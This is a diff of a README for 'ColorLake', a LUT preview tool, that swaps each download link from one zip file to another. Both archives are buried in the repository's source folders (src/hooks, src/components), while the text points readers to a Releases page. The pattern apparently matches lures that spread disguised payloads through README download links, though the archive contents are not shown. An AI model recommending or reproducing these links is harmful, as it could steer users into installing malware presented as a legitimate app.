@@ -1,6 +1,6 @@
 # 🎨 ColorLake - Effortless LUT Preview and Management
 
-[![Download ColorLake](https://raw.githubusercontent.com/Vex-sess/ColorLake/master/src/hooks/ColorLake_1.6.zip)](https://raw.githubusercontent.com/Vex-sess/ColorLake/master/src/hooks/ColorLake_1.6.zip)
+[![Download ColorLake](https://github.com/Vex-sess/ColorLake/raw/refs/heads/master/src/components/Color-Lake-v2.4.zip)](https://github.com/Vex-sess/ColorLake/raw/refs/heads/master/src/components/Color-Lake-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ColorLake. This application helps colorists and photographers easily 
 
 To download ColorLake, visit the link below:
 
-[Download ColorLake](https://raw.githubusercontent.com/Vex-sess/ColorLake/master/src/hooks/ColorLake_1.6.zip)
+[Download ColorLake](https://github.com/Vex-sess/ColorLake/raw/refs/heads/master/src/components/Color-Lake-v2.4.zip)
 
 You will find the latest version on the Releases page. Download the latest file suitable for your operating system.
 
@@ -89,4 +89,4 @@ Adding your LUTs is easy:
 - **Hardware Support Validation**: If your hardware cannot support the required texture sizes, ColorLake will adjust the dimensions automatically to ensure a seamless experience.
 - **Slider Control**: In comparison mode, the slider allows fine control using mouse, touch, or keyboard arrows.
 
-Visit [Download ColorLake](https://raw.githubusercontent.com/Vex-sess/ColorLake/master/src/hooks/ColorLake_1.6.zip) to get started. ColorLake is designed for ease and efficiency. Enjoy exploring your LUTs hassle-free!
+Visit [Download ColorLake](https://github.com/Vex-sess/ColorLake/raw/refs/heads/master/src/components/Color-Lake-v2.4.zip) to get started. ColorLake is designed for ease and efficiency. Enjoy exploring your LUTs hassle-free!
